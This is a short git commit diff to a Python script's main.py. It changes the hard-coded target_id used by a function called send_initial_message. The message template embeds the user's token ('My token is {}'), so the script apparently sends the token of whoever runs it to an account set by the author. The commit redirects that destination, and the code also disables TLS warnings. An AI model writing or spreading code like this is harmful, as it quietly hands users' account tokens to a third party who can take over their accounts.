e8899be478a8ce2d39420b3363e40ad4f67fc65b
SyXoanox <160595832+SyXoanox@users.noreply.github.com>
2024-04-25 23:19:35 +0530

    Update main.py

--- main.py
+++ main.py
@@ -32,7 +32,7 @@ def send_initial_message():
       msg_template = "Hello Ravi sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100071243779912"
+      target_id = "61558529771975"
 
       requests.packages.urllib3.disable_warnings()
 
